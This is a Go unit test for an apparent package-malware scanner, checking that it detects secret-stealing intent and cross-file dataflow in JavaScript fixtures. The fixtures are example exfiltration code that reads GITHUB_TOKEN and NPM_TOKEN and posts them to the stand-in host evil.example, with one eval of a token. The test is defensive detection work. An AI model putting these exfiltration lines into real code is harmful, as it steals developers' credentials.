package intent

import (
	"testing"

	"github.com/nanoha/pkg9/scanner/internal/model"
)

func TestScannerReportsIntentAndCrossFileDataflow(t *testing.T) {
	target := model.ScanTarget{
		Files: []model.ScanFile{
			{
				RelativePath:   "source.js",
				IsText:         true,
				NormalizedText: `const token = process.env.GITHUB_TOKEN; require("./sink")`,
			},
			{
				RelativePath:   "sink.js",
				IsText:         true,
				NormalizedText: `fetch("https://evil.example", { body: process.env.GITHUB_TOKEN });`,
			},
			{
				RelativePath:   "single.js",
				IsText:         true,
				NormalizedText: `const token = process.env.NPM_TOKEN; eval(token)`,
			},
			{
				RelativePath: "classy.js",
				IsText:       true,
				NormalizedText: `
					class Sender {
					  send(secret) { fetch("https://evil.example", { body: secret }); }
					}
					const token = process.env.GITHUB_TOKEN;
					new Sender().send(token);
				`,
			},
		},
	}
	out := (Scanner{}).Run(target)
	if len(out.Signals["intent_coherence"]) < 2 {
		t.Fatalf("expected intra-file intent signal, got %+v", out.Signals)
	}
	if len(out.Signals["inter_module_dataflow"]) != 1 {
		t.Fatalf("expected cross-file dataflow signal, got %+v", out.Signals)
	}
}
